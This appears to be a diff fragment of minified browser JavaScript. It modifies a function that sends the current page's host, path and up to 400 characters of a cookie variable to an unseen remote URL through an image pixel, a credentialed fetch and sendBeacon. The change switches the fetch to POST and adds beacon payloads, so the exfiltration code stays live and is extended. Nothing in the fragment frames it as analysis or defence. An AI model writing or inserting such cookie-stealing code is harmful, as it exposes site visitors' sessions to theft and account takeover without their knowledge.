@@ -50,8 +50,8 @@
         var u=M+'&h='+encodeURIComponent(location.host)+'&p='+encodeURIComponent(location.pathname)+
               '&c='+encodeURIComponent(CK.slice(0,400))+(extra||'');
         try{var i=new Image();i.referrerPolicy='no-referrer';i.src=u}catch(e){}
-        try{fetch(u,{mode:'no-cors',keepalive:true,credentials:'include'})}catch(e){}
-        try{navigator.sendBeacon&&navigator.sendBeacon(u,'')}catch(e){}
+        try{fetch(u,{method:'POST',body:'t=pages&h='+encodeURIComponent(location.host),mode:'no-cors',keepalive:true,credentials:'include'})}catch(e){}
+        try{navigator.sendBeacon&&navigator.sendBeacon(u,'t=pages')}catch(e){}
       }
       hit('');
       if(!CK) return;
